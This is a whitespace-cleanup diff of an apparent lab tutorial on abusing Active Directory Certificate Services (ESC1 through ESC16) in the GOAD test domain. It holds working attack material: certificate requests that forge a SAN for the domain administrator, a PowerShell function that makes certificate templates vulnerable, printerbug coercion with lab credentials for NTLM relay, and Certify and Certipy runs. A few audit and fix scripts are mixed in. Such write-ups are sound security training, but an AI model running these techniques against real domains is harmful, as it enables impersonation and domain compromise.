@@ -41,12 +41,12 @@ Let's see what this looks like in our GOAD environment:
 nxc ldap 192.168.56.10-23 -u '' -p '' -M adcs
 
 SMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 17763 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)
-LDAPS       192.168.56.12   636    MEEREEN          [+] essos.local\guest: 
+LDAPS       192.168.56.12   636    MEEREEN          [+] essos.local\guest:
 ADCS        192.168.56.12   -      MEEREEN          Found PKI Enrollment Server: meereen.essos.local
 ADCS        192.168.56.12   -      MEEREEN          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
 
 SMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 17763 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
-LDAPS       192.168.56.23   636    BRAAVOS          [+] essos.local\guest: 
+LDAPS       192.168.56.23   636    BRAAVOS          [+] essos.local\guest:
 ADCS        192.168.56.23   -      BRAAVOS          Found PKI Enrollment Server: braavos.essos.local
 ADCS        192.168.56.23   -      BRAAVOS          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
 ```
@@ -282,37 +282,37 @@ public class CertificateRequestor
         var request = new CX509CertificateRequestPkcs10();
         var privateKey = new CX509PrivateKey();
         var csp = new CCspInformation();
-        
+
         // Configure private key
         privateKey.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider";
         privateKey.KeySpec = X509KeySpec.XCN_AT_KEYEXCHANGE;
         privateKey.Length = 2048;
         privateKey.Create();
-        
+
         // Build certificate request for GOAD environment
         request.InitializeFromPrivateKey(
             X509CertificateEnrollmentContext.ContextUser,
             privateKey,
             template);
-            
+
         // Add SAN extension for administrator@essos.local
         var sanExtension = new CX509ExtensionAlternativeNames();
         var altNames = new CAlternativeNames();
         var altNameObj = new CAlternativeName();
-        
+
         altNameObj.InitializeFromString(
             AlternativeNameType.XCN_CERT_ALT_NAME_RFC822_NAME,
             altName);
         altNames.Add(altNameObj);
-        
+
         sanExtension.InitializeEncode(altNames);
         request.X509Extensions.Add(sanExtension);
-        
+
         // Submit request
         var enroll = new CX509Enrollment();
         enroll.InitializeFromRequest(request);
         enroll.CertificateFriendlyName = "ESC1 Certificate";
-        
+
         return enroll.CreateRequest(EncodingType.XCN_CRYPT_STRING_BASE64);
     }
 }
@@ -397,7 +397,7 @@ ESC3 is a really cool technique that exploits certificate templates granting Cer
 
 The attack is pretty straightforward:
 1. Request an Enrollment Agent certificate
-2. Use that agent certificate to request certificates for other users  
+2. Use that agent certificate to request certificates for other users
 3. Authenticate as those users
 
 ### Implementation
@@ -556,13 +556,13 @@ function Modify-CertificateTemplate {
         [switch]$Restore,
         [string]$Domain = "essos.local"
     )
-    
+
     $configPath = "CN=Configuration," + (Get-ADDomain -Identity $Domain).DistinguishedName
     $templatePath = "CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configPath"
-    
+
     try {
         $template = Get-ADObject $templatePath -Properties "msPKI-Certificate-Name-Flag"
-        
+
         if ($Restore) {
             # Restore to secure setting
             Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=0}
@@ -572,11 +572,11 @@ function Modify-CertificateTemplate {
             Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=1}
             Write-Host "[+] Template $TemplateName modified to enable subject specification"
         }
-        
+
         # Wait for AD replication
         Write-Host "[*] Waiting for AD replication..."
         Start-Sleep -Seconds 30
-        
+
     } catch {
         Write-Error "Failed to modify template: $($_.Exception.Message)"
     }
@@ -743,7 +743,7 @@ Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:adm
 [*] Request ID              : 13
 ```
 
-Even though template doesn't allow subject specification, 
+Even though template doesn't allow subject specification,
 ESC6 allows it through the CA configuration
 
 ### Enabling the Flag (if you have CA admin rights). Enable the dangerous flag on GOAD CA:
@@ -903,7 +903,7 @@ python3 printerbug.py essos.local/missandei:fr3edom@meereen.essos.local braavos.
 [*] Attempting to trigger authentication via rprn RPC at meereen.essos.local
 [*] Bind OK
 [*] Got handle
-DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
 [*] Triggered RPC backconnect, this may or may not have worked
 
 # Back in ntlmrelayx window:
@@ -1149,31 +1149,31 @@ public class ESC11Exploit
     {
         var request = new CX509CertificateRequestPkcs10();
         var privateKey = new CX509PrivateKey();
-        
+
         // Configure for unencrypted submission to GOAD CA
         privateKey.ProviderName = "Microsoft Software Key Storage Provider";
         privateKey.Create();
-        
+
         request.InitializeFromPrivateKey(
             X509CertificateEnrollmentContext.ContextUser,
             privateKey,
             "");
-            
+
         request.Subject = new CX500DistinguishedName(subject);
-        
+
         // Add SAN for GOAD domain
         var sanExtension = new CX509ExtensionAlternativeNames();
         var altNames = new CAlternativeNames();
         var altNameObj = new CAlternativeName();
-        
+
         altNameObj.InitializeFromString(
             AlternativeNameType.XCN_CERT_ALT_NAME_RFC822_NAME,
             altname);
         altNames.Add(altNameObj);
-        
+
         sanExtension.InitializeEncode(altNames);
         request.X509Extensions.Add(sanExtension);
-        
+
         // Submit without encryption to vulnerable GOAD CA
         return request.Encode();
     }
@@ -1681,7 +1681,7 @@ Now we can request certificates on behalf of other users!
 All version 1 templates are potentially vulnerable when enrollment rights are granted in GOAD:
 - **WebServer** (most commonly exploited) ✓ Found in GOAD
 - ExchangeUser
-- CEPEncryption  
+- CEPEncryption
 - OfflineRouter
 - IPSECIntermediateOffline
 - SubCA
@@ -1731,7 +1731,7 @@ Certipy v5.0.0 - by Oliver Lyak (ly4k)
 
 [!] ESC16: CA 'ESSOS-CA' is configured to omit szOID_NTDS_CA_SECURITY_EXT on all certificates!
     This makes ALL certificates vulnerable to impersonation attacks.
-    
+
     CA Name                         : ESSOS-CA
     DNS Hostname                    : braavos.essos.local
     Certificate Subject             : CN=ESSOS-CA, DC=essos, DC=local
@@ -1836,21 +1836,21 @@ Import-Module ActiveDirectory
 # Audit all CAs in GOAD environment for ESC16
 $goadCAs = @(
     "braavos.essos.local\ESSOS-CA",
-    "kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA", 
+    "kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA",
     "winterfell.north.sevenkingdoms.local\NORTH-CA"
 )
 
 foreach ($ca in $goadCAs) {
     Write-Host "[*] Checking CA: $ca for ESC16"
-    
+
     try {
         $disableExtList = certutil -config $ca -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList
-        
+
         # Check if szOID_NTDS_CA_SECURITY_EXT is in the disable list
         if ($disableExtList -match "1\.3\.6\.1\.4\.1\.311\.25\.2") {
             Write-Warning "[!] ESC16 detected on CA: $ca"
             Write-Warning "    szOID_NTDS_CA_SECURITY_EXT is disabled"
-            
+
             # Fix the misconfiguration by removing the OID from DisableExtensionList
             certutil -config $ca -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList -"1.3.6.1.4.1.311.25.2"
             Write-Host "[+] Fixed ESC16 on CA: $ca"
